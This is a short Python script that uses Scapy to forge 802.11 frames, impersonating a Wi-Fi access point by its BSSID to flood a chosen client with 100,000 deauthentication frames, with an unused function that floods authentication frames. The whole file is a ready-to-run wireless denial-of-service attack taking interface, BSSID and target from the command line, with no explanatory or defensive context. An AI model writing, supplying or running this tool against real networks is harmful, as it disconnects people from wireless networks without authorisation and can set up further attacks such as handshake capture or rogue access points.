from scapy.all import (
  RadioTap,    # Adds additional metadata to an 802.11 frame
  Dot11,       # For creating 802.11 frame
  Dot11Deauth, # For creating deauth frame
  Dot11Auth,
  sendp        # for sending packets
)
import sys


def deauth(inface, bssid, target):
    dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth()
    sendp(frame, iface=inface, count=100000, inter=0.001)


    pass

def auth(inface, bssid, target):
	dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
	frame=RadioTap()/dot11/Dot11Auth()
	sendp(frame, iface=inface, count=100000, inter=0.001)

if __name__ == "__main__":	
	interface1 = sys.argv[1]
	bssid1 = sys.argv[2]
	target1 = sys.argv[3]
	
	deauth(inface=interface1, bssid=bssid1, target=target1)